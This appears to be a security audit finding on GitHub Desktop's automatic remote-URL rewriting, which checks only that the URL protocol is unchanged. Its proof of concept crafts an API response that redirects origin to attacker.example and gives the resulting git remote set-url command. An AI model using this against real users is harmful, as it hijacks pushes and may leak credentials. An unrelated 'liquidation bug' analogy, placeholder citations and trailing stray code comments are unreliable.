### Title
Silent auto-rewrite of a repository's git remote URL based on an unauthenticated hostname/owner check ("protocol-only" match) - ([File: app/src/lib/stores/updates/update-remote-url.ts])

### Summary
`updateRemoteUrl()` silently executes `git remote set-url` on a user's local repository, driven entirely by the `clone_url` field returned from a GitHub/GHE API response. The only safety check performed before rewriting the remote is that the URL *scheme* (https vs ssh) is unchanged — the destination host, owner, and repo name are never validated. This mirrors the broken-invariant pattern in the liquidation bug: a security-relevant state transition (there, `startLiqTimestamp`; here, the `origin` remote URL) is permitted based on a condition that looks protective but is actually too weak ("unmark ratio too close to 1.0" / "protocol matches"), letting an untrusted input silently overwrite state the user did not consciously approve.

### Finding Description
The auto-sync flow is:

1. `repositoryWithRefreshedGitHubRepository()` re-derives the owner/name for a tracked repository from its *current* git remote URL via `matchGitHubRepository()`, then calls `api.fetchRepository(owner, name)` against the account's configured endpoint. [1](#0-0) 

2. The `apiRepo` returned from that request is passed straight into `updateRemoteUrl()`: [2](#0-1) 

3. The function's only gate against changing the remote is `protocolsMatch`, computed by comparing `URL.parse(...).protocol` of the old and new URL — this checks `https:` vs `https:`/`ssh:`, nothing about hostname, owner, or repo name: [3](#0-2) 

4. If `protocolsMatch && remoteUrlUnchanged && !urlsMatch`, Desktop calls `gitStore.setRemoteURL(...)`, which shells out to `git remote set-url` with no user confirmation and no re-validation of the new host: [4](#0-3) [5](#0-4) 

This is invoked automatically on ordinary refresh paths — e.g. every time a repository is added or selected — without the user initiating any "change remote" action: [6](#0-5) 

The `apiRepo.clone_url` field is attacker-influenceable in the threat model this exercise targets ("a GitHub API object... or a git remote/proxy response"): a GitHub Enterprise Server the user has configured, or any man-in-the-middle/rogue proxy terminating the API endpoint the account is bound to, can return an arbitrary `clone_url` in the JSON body of `GET repos/{owner}/{name}`, as consumed here: [7](#0-6) 

Because `protocolsMatch` accepts any `https:` URL regardless of host, the malicious response can point `clone_url` at `https://attacker.example/foo/bar.git` and Desktop will silently retarget the user's `origin` remote to that host.

### Impact Explanation
Once the remote is rewritten, every subsequent `git push` from Desktop (and manual `git push` in a terminal using the same remote) is silently redirected to the attacker's endpoint instead of the real GitHub/GHE repository. This is exactly the "silent corruption of what the user commits or pushes" impact category: the user believes they are pushing to their known repository, but Desktop has quietly changed where `origin` points, with no dialog, confirmation, or diff shown to the user (unlike the explicit, user-initiated remote-URL change in `RepositorySettings`, which does show a form the user must submit): [8](#0-7) 

Depending on the git credential helper configuration, this could also cause credentials/tokens to be sent to the attacker-controlled host during the push handshake, which would satisfy the "credential/token exfiltration" impact category as well.

### Likelihood Explanation
The refresh path that triggers `updateRemoteUrl` runs automatically and routinely (on adding a repository, selecting a repository, and periodic background refreshes), so no unusual user action is required beyond having previously added/authenticated a GitHub Enterprise account or having their network path to the API endpoint's DNS/TLS compromised. The existing guard (`protocolsMatch`) gives a false sense of safety — it was clearly intended to prevent exactly this class of unwanted retargeting but fails to check the actual authority component of the URL (hostname/owner/repo), so it does not stop the attack.

### Recommendation
`updateRemoteUrl()` should not treat "protocol unchanged" as sufficient authorization to auto-rewrite the remote. At minimum:
- Require that the new URL's hostname matches the existing remote's/account's expected hostname before silently updating.
- Prefer prompting the user (similar to the explicit flow in `repository-settings.tsx`) whenever the target host of `origin` would change, rather than silently calling `setRemoteURL`.
- Consider dropping automatic remote rewriting entirely for cross-host changes, only auto-syncing owner/name-only renames within the same host.

### Proof of Concept
1. Add a GitHub Enterprise Server account to Desktop pointing at `https://ghe.evil-or-compromised.example`.
2. Add/clone a repository whose `origin` remote is `https://ghe.evil-or-compromised.example/acme/project.git`.
3. The attacker (server operator, or a MITM/rogue proxy in front of that endpoint) crafts the JSON response for `GET repos/acme/project` to include `"clone_url": "https://attacker.example/acme/project.git"` while keeping the response otherwise valid.
4. On Desktop's next repository refresh (e.g., simply selecting the repository or the periodic background refresh), `repositoryWithRefreshedGitHubRepository` → `updateRemoteUrl` runs: `protocolsMatch` is true (both `https:`), `remoteUrlUnchanged` is true, `urlsMatch` is false, so Desktop silently executes `git remote set-url origin https://attacker.example/acme/project.git`.
5. The next `git push` performed via Desktop (or the user's terminal) is sent to `attacker.example` instead of the real GHE host, with no warning shown to the user.

  // to alter the protocol in case they are relying on a specific one.
  // If protocol is null that implies the url is a ssh url
